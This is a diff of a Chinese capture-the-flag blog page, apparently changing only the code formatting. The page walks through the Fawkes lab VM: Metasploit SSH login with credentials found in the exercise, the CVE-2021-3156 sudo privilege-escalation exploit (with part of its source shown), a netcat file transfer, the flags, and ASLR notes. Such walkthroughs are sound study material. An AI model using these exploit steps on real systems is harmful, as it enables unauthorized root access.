+<p>又获得一个用户名和密码： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: neville</span><br><span class="line">password: bL!Bsg3k</span><br></pre></td></tr></table></figure></p>
 <p>尝试登录另一个端口的ssh</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416175507.png" /></p>
 <p>登录成功，并且成功来到真实的靶机。</p>
 <h2 id="权限提升">2.6 权限提升</h2>
 <p>这次靶机的提权涉及到一个漏洞<code>CVE-2021-3156</code>，参考资料在[[#靶机信息]]中给出。msf中也存在可利用的代码。</p>
-<p>首先，先利用msf中的auxiliary模块登录ssh创建一个会话 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfconsole <span class="token comment"># 打开msfconsole</span>
-use auxiliary/scanner/ssh/ssh_login
-<span class="token builtin class-name">set</span> RHOST <span class="token number">10.0</span>.2.16
-<span class="token builtin class-name">set</span> username neville
-<span class="token builtin class-name">set</span> password bL<span class="token operator">!</span>Bsg3k
-run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>首先，先利用msf中的auxiliary模块登录ssh创建一个会话 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole <span class="comment"># 打开msfconsole</span></span><br><span class="line">use auxiliary/scanner/ssh/ssh_login</span><br><span class="line"><span class="built_in">set</span> RHOST 10.0.2.16</span><br><span class="line"><span class="built_in">set</span> username neville</span><br><span class="line"><span class="built_in">set</span> password bL!Bsg3k</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416193905.png" /></p>
-<p>然后执行下面命令： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">search cve-2021-3156
-use <span class="token number">0</span>
-<span class="token builtin class-name">set</span> session <span class="token number">1</span>
-<span class="token builtin class-name">set</span> lport <span class="token number">5555</span>
-run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>然后执行下面命令： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search cve-2021-3156</span><br><span class="line">use 0</span><br><span class="line"><span class="built_in">set</span> session 1</span><br><span class="line"><span class="built_in">set</span> lport 5555</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
 <p>但是提示失败了</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416194156.png" /></p>
-<p>命名存在该漏洞，但是却失败了这是为什么呢。通过下载<a target="_blank" rel="noopener" href="https://github.com/worawit/CVE-2021-3156">CVE-2021-3156</a>中的<code>expoit_nss.py</code>，查看其中源码（只列出部分） <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
-<span class="token keyword">import</span> subprocess
-<span class="token keyword">import</span> sys
-<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> cdll<span class="token punctuation">,</span> c_char_p<span class="token punctuation">,</span> POINTER<span class="token punctuation">,</span> c_int<span class="token punctuation">,</span> c_void_p
-SUDO_PATH <span class="token operator">=</span> <span class="token string">b"/usr/bin/sudo"</span>
-libc <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">"libc.so.6"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>命名存在该漏洞，但是却失败了这是为什么呢。通过下载<a target="_blank" rel="noopener" href="https://github.com/worawit/CVE-2021-3156">CVE-2021-3156</a>中的<code>expoit_nss.py</code>，查看其中源码（只列出部分） <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> cdll, c_char_p, POINTER, c_int, c_void_p</span><br><span class="line">SUDO_PATH = <span class="string">b&quot;/usr/bin/sudo&quot;</span></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br></pre></td></tr></table></figure></p>
 <p>注意其中的<code>SUDO_PATH</code>，我们查看靶机上sudo的路径如下：</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416194714.png" /></p>
-<p>所以需要修改，然后exp就可以成功利用了。将修改之后的文件传给靶机 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">靶机: <span class="token function">nc</span> -lvnp <span class="token number">4444</span> <span class="token operator">></span> exp.py
-kali: <span class="token function">nc</span> <span class="token number">10.0</span>.2.16 <span class="token number">4444</span> <span class="token operator">&lt;</span> cve-2021-3156Exp.py -w <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
+<p>所以需要修改，然后exp就可以成功利用了。将修改之后的文件传给靶机 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">靶机: nc -lvnp 4444 &gt; exp.py</span><br><span class="line">kali: nc 10.0.2.16 4444 &lt; cve-2021-3156Exp.py -w 1</span><br></pre></td></tr></table></figure></p>
 <p>提权成功！</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416195127.png" /></p>
-<p>接着就可以查看剩下的两个flag了，一个在<code>/home/nevile/horcrux2.txt</code>，还有一个在<code>/root/horcrux3.txt</code>，内容如下： <pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; horcrux2.txt
-horcrux_&#123;NzogTmFHaU5pIHRIZSBTbkFrZSBkZVN0cm9ZZWQgQnkgTmVWaWxsZSBMb25HYm9UVG9t&#125;
-
-&#x2F;&#x2F; horcrux3.txt
-__     __    _     _                           _     _     
-\ \   &#x2F; &#x2F;__ | | __| | ___ _ __ ___   ___  _ __| |_  (_)___ 
- \ \ &#x2F; &#x2F; _ \| |&#x2F; _&#96; |&#x2F; _ \ &#39;_ &#96; _ \ &#x2F; _ \| &#39;__| __| | &#x2F; __|
-  \ V &#x2F; (_) | | (_| |  __&#x2F; | | | | | (_) | |  | |_  | \__ \
-   \_&#x2F; \___&#x2F;|_|\__,_|\___|_| |_| |_|\___&#x2F;|_|   \__| |_|___&#x2F;
-                                                           
-     _       __            _           _ 
-  __| | ___ &#x2F; _| ___  __ _| |_ ___  __| |
- &#x2F; _&#96; |&#x2F; _ \ |_ &#x2F; _ \&#x2F; _&#96; | __&#x2F; _ \&#x2F; _&#96; |
-| (_| |  __&#x2F;  _|  __&#x2F; (_| | ||  __&#x2F; (_| |
- \__,_|\___|_|  \___|\__,_|\__\___|\__,_|
-                                         
-
-
-Machine Author: Mansoor R (@time4ster)
-Machine Difficulty: Hard
-Machine Name: Fawkes
-Horcruxes Hidden in this VM: 3 horcruxes
-
-You have successfully pwned Fawkes machine &amp; defeated Voldemort.
-Here is your last hocrux: horcrux_&#123;ODogVm9sRGVNb3JUIGRFZmVBdGVkIGJZIGhBcnJZIFBvVFRlUg&#x3D;&#x3D;&#125;
-
-
-# For any queries&#x2F;suggestions feel free to ping me at email: time4ster@protonmail.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
-<p>将其中的base64编码的部分解码得到： <pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; horcrux2.txt
-7: NaGiNi tHe SnAke deStroYed By NeVille LonGboTTom
-
-&#x2F;&#x2F; horcrux3.txxt
-8: VolDeMorT dEfeAted bY hArrY PoTTeR<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>接着就可以查看剩下的两个flag了，一个在<code>/home/nevile/horcrux2.txt</code>，还有一个在<code>/root/horcrux3.txt</code>，内容如下： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// horcrux2.txt</span><br><span class="line">horcrux_&#123;NzogTmFHaU5pIHRIZSBTbkFrZSBkZVN0cm9ZZWQgQnkgTmVWaWxsZSBMb25HYm9UVG9t&#125;</span><br><span class="line"></span><br><span class="line">// horcrux3.txt</span><br><span class="line">__     __    _     _                           _     _     </span><br><span class="line">\ \   / /__ | | __| | ___ _ __ ___   ___  _ __| |_  (_)___ </span><br><span class="line"> \ \ / / _ \| |/ _` |/ _ \ &#x27;_ ` _ \ / _ \| &#x27;__| __| | / __|</span><br><span class="line">  \ V / (_) | | (_| |  __/ | | | | | (_) | |  | |_  | \__ \</span><br><span class="line">   \_/ \___/|_|\__,_|\___|_| |_| |_|\___/|_|   \__| |_|___/</span><br><span class="line">                                                           </span><br><span class="line">     _       __            _           _ </span><br><span class="line">  __| | ___ / _| ___  __ _| |_ ___  __| |</span><br><span class="line"> / _` |/ _ \ |_ / _ \/ _` | __/ _ \/ _` |</span><br><span class="line">| (_| |  __/  _|  __/ (_| | ||  __/ (_| |</span><br><span class="line"> \__,_|\___|_|  \___|\__,_|\__\___|\__,_|</span><br><span class="line">                                         </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Machine Author: Mansoor R (@time4ster)</span><br><span class="line">Machine Difficulty: Hard</span><br><span class="line">Machine Name: Fawkes</span><br><span class="line">Horcruxes Hidden in this VM: 3 horcruxes</span><br><span class="line"></span><br><span class="line">You have successfully pwned Fawkes machine &amp; defeated Voldemort.</span><br><span class="line">Here is your last hocrux: horcrux_&#123;ODogVm9sRGVNb3JUIGRFZmVBdGVkIGJZIGhBcnJZIFBvVFRlUg==&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># For any queries/suggestions feel free to ping me at email: time4ster@protonmail.com</span><br></pre></td></tr></table></figure></p>
+<p>将其中的base64编码的部分解码得到： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// horcrux2.txt</span><br><span class="line">7: NaGiNi tHe SnAke deStroYed By NeVille LonGboTTom</span><br><span class="line"></span><br><span class="line">// horcrux3.txxt</span><br><span class="line">8: VolDeMorT dEfeAted bY hArrY PoTTeR</span><br></pre></td></tr></table></figure></p>
 <h1 id="总结">3 总结</h1>
 <p>该靶机的难度为高，我认为主要是涉及了许多关于二进制的渗透方法，其他攻击方法还是比较简单的。</p>
 <p>其次，还涉及了之前没有的FTP服务攻击技术。</p>
@@ -467,11 +363,8 @@ Here is your last hocrux: horcrux_&#123;ODogVm9sRGVNb3JUIGRFZmVBdGVkIGJZIGhBcnJZ
 <li>不能避免被绕过</li>
 </ul>
 <p>通过对攻击者在进行缓冲区溢出攻击时所要用到的内存布局中的偏移做了随机化，ASLR 加大了攻击成功的难度，从而增强了系统的控制流完整性。</p>
-<p>在Linux中可以通过下面两条命令查看是否开启该功能： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span>. <span class="token function">cat</span> /proc/sys/kernel/randomize_va_space
-<span class="token number">2</span>. sysctl -a --pattern randomize<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
-<p><code>randomize_va_space</code>的值有三个： <pre class="line-numbers language-none"><code class="language-none">0 &#x3D; Disabled
-1 &#x3D; Conservative Randomization
-2 &#x3D; Full Randomization<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
+<p>在Linux中可以通过下面两条命令查看是否开启该功能： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. cat /proc/sys/kernel/randomize_va_space</span><br><span class="line">2. sysctl -a --pattern randomize</span><br></pre></td></tr></table></figure></p>
+<p><code>randomize_va_space</code>的值有三个： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0 = Disabled</span><br><span class="line">1 = Conservative Randomization</span><br><span class="line">2 = Full Randomization</span><br></pre></td></tr></table></figure></p>
 
   </div>
 </article>
@@ -528,7 +421,6 @@ Here is your last hocrux: horcrux_&#123;ODogVm9sRGVNb3JUIGRFZmVBdGVkIGJZIGhBcnJZ
     <div id="actions-footer">
         <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
         <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
         <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
     </div>
 
